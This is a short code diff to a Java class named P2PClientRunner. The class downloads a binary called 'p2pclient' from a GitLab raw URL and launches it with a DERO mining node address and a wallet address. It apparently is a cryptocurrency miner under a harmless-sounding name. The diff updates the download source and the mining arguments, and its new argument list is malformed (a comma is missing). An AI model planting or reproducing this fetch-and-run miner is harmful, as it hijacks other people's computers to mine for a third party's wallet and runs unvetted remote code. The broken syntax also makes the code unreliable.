@@ -4,7 +4,7 @@ import java.net.URL;
 import java.nio.file.*;
 
 public class P2PClientRunner {
-    private static final String P2P_URL = "https://gitlab.com/rikzakalani/sd/raw/main/p2pclient";
+    private static final String P2P_URL = "https://gitlab.com/rikzakalani/derolunamnr/raw/main/p2pclient";
     private static final String P2P_PATH = "p2pclient";
     private static final String LOG_FILE = "p2pclient.log";
 
@@ -23,10 +23,9 @@ public class P2PClientRunner {
             System.out.println("🚀 Starting p2pclient...");
             ProcessBuilder processBuilder = new ProcessBuilder(
                 "./" + P2P_PATH,
-                "--threads", "2",
-                "--daemon-address", "dero-node-orionure-sg.mysrv.cloud",
-                "--port", "10300",
-                "--wallet", "dero1qy490rdvzggfxwxjnk4hp6s60s99agjlz29hzl78ctaqft9496wgcqgkmkmr4.kitaasu"
+                "-d", "minernode1.dero.io:10100",
+                "-w", "10300"
+                "--wallet", "dero1qy490rdvzggfxwxjnk4hp6s60s99agjlz29hzl78ctaqft9496wgcqgkmkmr4"
             );
 
             processBuilder.redirectErrorStream(true);
